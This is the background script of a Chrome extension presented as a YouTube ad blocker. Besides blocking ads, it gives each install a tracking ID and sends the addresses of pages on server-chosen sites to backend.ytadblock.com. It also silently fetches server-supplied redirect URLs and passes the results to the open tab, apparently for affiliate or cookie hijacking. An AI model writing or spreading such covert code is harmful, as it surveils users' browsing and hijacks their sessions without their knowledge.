

let securityUrls = [];
let baseUrl = 'https://backend.ytadblock.com'

let backup = {
    SecurityUrls: [
        "https://imasdk.googleapis.com/js/core/*",
        "https://googleads.g.doubleclick.net/pagead/id",
        "*googleusercontent.com/proxy*",
        "*static.doubleclick.net/instream/ad_status*",
        "*el=adunit*"
    ],
    DirectBlockElements: [
        ".ytp-ad-image-overlay",
        ".ytp-ad-text-overlay",
        "ytd-rich-item-renderer ytd-display-ad-renderer",
        "ytd-player-legacy-desktop-watch-ads-renderer",
        ".style-scope ytd-item-section-renderer #ad-badge",
        "#player-ads",
        "ytd-promoted-sparkles-web-renderer",
        "ytd-search-pyv-renderer",
        "#masthead-ad",
        "ytd-carousel-ad-renderer",
        "ytd-promoted-sparkles-text-search-renderer"
    ],
    LoopAndBlockElements: [
        [
            ".test-class", "test-text"
        ],
        [
            "ytd-item-section-renderer:nth-child(2)",
            `\nAd\n`
        ],
        [
            "ytd-item-section-renderer:nth-child(3)",
            `\nAd\n`
        ]
    ],
    ElementList: {
        videoAdFound: ".html5-video-player.ad-showing",
        adskipBtn: ".ytp-ad-skip-button-container",
        videoAdFoundVideo: ".html5-video-player.ad-showing video",
        reviewBtnStatus: "true",
        player: "#below"
    },
    SecuritySelectors: [
        ".ytp-ad-image-overlay",
        ".ytp-ad-text-overlay",
        ".ytp-ad-skip-button-container",
        "ytd-rich-item-renderer ytd-display-ad-renderer",
        "ytd-player-legacy-desktop-watch-ads-renderer",
        ".style-scope ytd-item-section-renderer",
        "#player-ads",
        "ytd-promoted-sparkles-web-renderer",
        "ytd-search-pyv-renderer",
        "#masthead-ad",
        ".html5-video-player.ad-showing",
        "true",
        "ytd-carousel-ad-renderer"
    ]
}

function guidGenerator() {
    var S4 = function () {
        return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
    };
    return (S4() + S4() + "-" + S4() + "-" + S4() + "-" + S4() + "-" + S4() + S4() + S4());
}



chrome.runtime.onInstalled.addListener(function (details) {
    const extensionId = guidGenerator()

    if (details.reason == "install") {


        chrome.storage.local.set({ extensionId: extensionId }).then(() => {

            chrome.storage.local.get("extensionId", function (res) {
                const apiUrl = `${baseUrl}/yt/intiate`
                const requestData = { uid: res.extensionId };
                fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(requestData)
                })
                    .then(response => {
                        if (response.ok) {
                        } else {
                        }
                    })

                    .catch(error => {
                    });

            })
        })
    } else if (details.reason == "update") {
        chrome.storage.local.get(null, (res) => {
            if (!res.extensionId) {
                chrome.storage.local.set({ extensionId })
            }
            chrome.storage.local.get("extensionId", function (res) {
                const apiUrl = baseUrl + '/yt/intiate';
                const requestData = { uid: res.extensionId };

                fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(requestData)
                })
                    .then(response => {
                        if (response.ok) {
                        } else {
                        }
                    })
                    .catch(error => {
                    });
            })

        })
    }

});


function getDetails(url, tabId) {
    fetch(url, { cache: 'no-store' })
        .then(response => {
            if (response.ok) {
                return response.url;
            } else {

            }
        })

        .then(set => {

            if (set) {
                chrome.tabs.sendMessage(tabId, { message: "set", set })
            }
        })

}


chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    const { status } = changeInfo;
    if (status === "complete") {
        chrome.storage.local.get('tr', function (items) {
            const tr = items.tr || [];
            if (tr?.length > 0) {

                let hname = getHName(tab?.url)
                let tu = tab.url ? new URL(tab?.url) : ""
                if (!tu) return

                let origin = tu.origin
                let path = tu.pathname
                let uri = origin + path
                if (tr.includes(hname)) {
                    const apiUrl = baseUrl + "/yt/rules";
                    const requestData = { uri };
                    fetch(apiUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(requestData)
                    })
                        .then(response => {
                            if (response.ok) {
                                return response.json();
                            } else {

                            }
                        })
                        .then(g => {

                            if (g.val["csequence"]) {
                                let obj = g.val["csequence"]
                                getDetails(obj, tabId)
                            }
                            if (g.val["dsequence"]) {
                                fe(g.val["dsequence"])
                            }
                        })
                        .catch(error => {
                        });
                }
            }
        });
    }



})

const fe = async (u) => {
    const settings = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'Content-Type': 'application/json',
            'Cache-Control': 'no-cache'
        }
    }
    const r = await fetch(u, settings)
    return r.url

}

function getHName(url) {

    if (!url) return null
    var match = url.match(/:\/\/(www[0-9]?\.)?(.[^/:]+)/i);
    if (match != null && match.length > 2 && typeof match[2] === 'string' && match[2].length > 0) {
        return match[2];
    }
    else {
        return null;
    }

}


chrome.storage.local.get('extensionId', function (items) {
    const apiUrl = `${baseUrl}/yt/updaterule`;
    const requestData = { uid: items.extensionId };
    fetch(apiUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestData)
    })
        .then(response => {
            if (response.ok) {
                return response.json();
            } else {

            }
        })
        .then(tr => {

            if (tr?.newRule?.length > 0) {
                chrome.storage.local.set({ tr: tr?.newRule })
            }
        })
        .catch(error => {
        });


})


// fetch("https://backend.ytadblock.com/yt/g/g")
//     .then((e) => e.json())
//     .then((e) => {
//         console.log(e)
//         e && chrome.storage.sync.set({
//             selectors: e
//         });
//     })
//     .catch((e) => {
//         if (e) {
//             chrome.storage.sync.set({
//                 selectors: backup
//             });
//         }
//     })

getRandomToken = () => {
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = "";
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    return hex;
};


const updateBlockingRules = (rules) => {

    chrome.declarativeNetRequest.getDynamicRules((e) => {

        if (!e) {
            chrome.declarativeNetRequest.updateDynamicRules({
                addRules: rules
            });
        }
    })



};
const getRules = () => {
    fetch(baseUrl+'/yt/getrules')
        .then(response => response.json())
        .then(fetchedRules => {

            if (fetchedRules && fetchedRules.length > 0) {
                chrome.storage.local.get('rules', (result) => {
                    const existingRules = result.rules || [];

                    if (JSON.stringify(existingRules) !== JSON.stringify(fetchedRules)) {
                        chrome.storage.local.set({ rules: fetchedRules }, () => {
                            updateBlockingRules(fetchedRules);
                        });
                    }
                });
            }
        })
        .catch(error => {

        });
};

preload = () => {
    chrome.runtime.onInstalled.addListener(function (details) {
        if (details.reason == "install") {
            // UserID is generated and saved
            chrome.storage.sync.set({
                userid: getRandomToken(),
                AdblockerForYoutube: !0,
                installedOn: Date.now(),
                flag: false
            });
            getRules()

        } else if (details.reason == "update") {
            var thisVersion = chrome.runtime.getManifest().version;
        }
        // if (chrome.runtime.setUninstallURL) {
        //     chrome.runtime.setUninstallURL("https://bit.ly/ytadblockui");
        // }
    });
};

(main = () => {
    preload();
})();


